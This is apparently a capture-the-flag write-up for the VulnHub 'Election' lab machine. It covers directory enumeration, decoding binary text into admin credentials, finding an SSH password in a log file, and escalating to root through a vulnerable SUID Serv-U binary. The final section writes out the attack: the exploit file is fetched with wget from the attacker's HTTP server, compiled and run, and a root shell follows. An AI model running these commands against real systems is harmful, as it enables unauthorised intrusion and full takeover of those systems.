---
layout: "post"
title: "Election Walkthrough"
categories: [vulnhub, OSCP-Like]
tags: [medium, oscp, election, Serv-U, suid]
---
It is an OSCP-like box, where the initial credentials can be found by converting binary to ascii. We found another creds in system log file. Used this creds to access ssh and priv sec to root by exploiting SUID.   

# Summary
- Portscan
- Use Gobuster find directories.
- Binary to ascii
- Login to election admin panel.
- Finding creds in log file
- SSH to box
- Priv sec to root using SUID
- Root Flag

# Portscan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Port 80 website enumeration
The web server displays the default Ubuntu apache page:
![apache](/assets/img/election/apache.png)
When running gobuster I found an interesting `/election` directory.
```
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.8 -x php,txt
/index.html (Status: 200)
/javascript (Status: 301)
/robots.txt (Status: 200)
/election (Status: 301)
/phpmyadmin (Status: 301)
/phpinfo.php (Status: 200)
/server-status (Status: 403)
```
![election](/assets/img/election/election.png)
`/election` directory doesn’t appear to contain anything interesting, so I decided to enumerate more.
```
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.8/election -x php,txt
/media (Status: 301)
/themes (Status: 301)
/data (Status: 301)
/admin (Status: 301)
/index.php (Status: 200)
/lib (Status: 301)
/languages (Status: 301)
/js (Status: 301)
/card.php (Status: 200)
```
# Binary to Ascii
The `card.php` contains the binary code.
```
$curl http://192.168.1.8/election/card.php
00110000 00110001 00110001 00110001 00110000 00110001 00110000 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110001 00110001 00110000 00110000 00110001 00110000 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110001 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110000 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110001 00110000 00110000 00100000 00110000 00110000 00110000 00110000 00110001 00110000 00110001 00110000 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110000 00110000 00100000 00110000 00110001 00110001 00110000 00110000 00110000 00110000 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110001 00110001 00110000 00110001 00110000 00100000 00110000 00110001 00110000 00110001 00110001 00110000 00110001 00110000 00100000 00110000 00110001 00110001 00110001 00110001 00110000 00110000 00110000 00100000 00110000 00110001 00110001 00110000 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110000 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110000 00110000 00110000 00110000 00110001 00100000 00110000 00110001 00110000 00110000 00110000 00110000 00110000 00110000 00100000 00110000 00110000 00110001 00110000 00110000 00110000 00110001 00110001
```
Convert binary to ascii and we get credentials.
![1](/assets/img/election/bta1.png)
![2](/assets/img/election/bta2.png)

```
user : 1234
pass : Zxc123!@#
```
# Election Admin Panel
Use this to access election panel. Under `system info` we get log file.
![log](/assets/img/election/log.png)
The log file contains credentials.
```
$cat system.log 
[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123
[2020-04-03 00:13:53] Love added candidate 'Love'.
[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).
```
```
username : love
password : P@$$w0rd@123
```
# SSH
We can use this credentials to access SSH.
```
$ssh love@192.168.1.8
love@192.168.1.8's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Kubernetes 1.19 is out! Get it in one command with:

     sudo snap install microk8s --channel=1.19 --classic

   https://microk8s.io/ has docs and details.

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

74 packages can be updated.
28 updates are security updates.
```

# Priv sec to root
While checking SUID files, `/usr/local/Serv-U/Serv-U` seem suspicious to me.
```
love@election:~$ find / -perm -4000 2>/dev/null
/tmp
/usr/bin/arping
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/sbin/pppd
/usr/local/Serv-U/Serv-U
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
...
...
/snap/core18/1223/usr/bin/sudo
/snap/core18/1223/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1223/usr/lib/openssh/ssh-keysign
```
I checked `/usr/local/Serv-U` directory and found Serv-U version
```
love@election:/usr/local/Serv-U$ cat Serv-U-StartupLog.txt 
[01] Fri 04Sep20 10:34:20 - Serv-U File Server (64-bit) - Version 15.1 (15.1.6.25) - (C) 2017 SolarWinds Worldwide, LLC.  All rights reserved.
[01] Fri 04Sep20 10:34:20 - Build Date: Wednesday, November, 29, 2017 11:28 AM
[01] Fri 04Sep20 10:34:20 - Operating System: Linux 64-bit; Version: 5.3.0-46-generic
[01] Fri 04Sep20 10:34:20 - Loaded graphics library.
[01] Fri 04Sep20 10:34:20 - Unable to load ODBC database libraries.  Install package "unixODBC" to use a database within Serv-U.
[01] Fri 04Sep20 10:34:20 - Loaded SSL/TLS libraries.
[01] Fri 04Sep20 10:34:20 - Loaded SQLite library.
[01] Fri 04Sep20 10:34:20 - FIPS 140-2 mode is OFF.
[01] Fri 04Sep20 10:34:20 - LICENSE: Running beyond trial period.  Serv-U will no longer accept connections.
[01] Fri 04Sep20 10:34:20 - Socket subsystem initialized.
[01] Fri 04Sep20 10:34:20 - HTTP server listening on port number 43958, IP 127.0.0.1
[01] Fri 04Sep20 10:34:20 - HTTP server listening on port number 43958, IP ::1
```
Here is an exploit I found on searchsploit.
```
$searchsploit Serv-U 15.1
----------------------------------------------------------------------------------------------------- 
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (1)                                          | linux/local/47009.c
Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (2)                                          | multiple/local/47173.sh
----------------------------------------------------------------------------------------------------- 
```
I transfer `47009.c` to server and by executing we get root access.
```
$python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.1.8 - - [04/Sep/2020 12:20:58] "GET /47009.c HTTP/1.1" 200 -
```

```
love@election:/tmp$ wget http://192.168.1.2:8000/47009.c
--2020-09-04 12:19:50--  http://192.168.1.2:8000/47009.c
Connecting to 192.168.1.2:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 619 [text/plain]
Saving to: ‘47009.c’

47009.c                           100%[============================================================>]     619  --.-KB/s    in 0s      

2020-09-04 12:19:50 (4.39 MB/s) - ‘47009.c’ saved [619/619]

love@election:/tmp$ gcc 47009.c -o exploit
love@election:/tmp$ ./exploit 
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
opening root shell
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)

```
# Flag
```
# cat root.txt
5238feefc4ffe09645d97e9ee49bc3a6

```
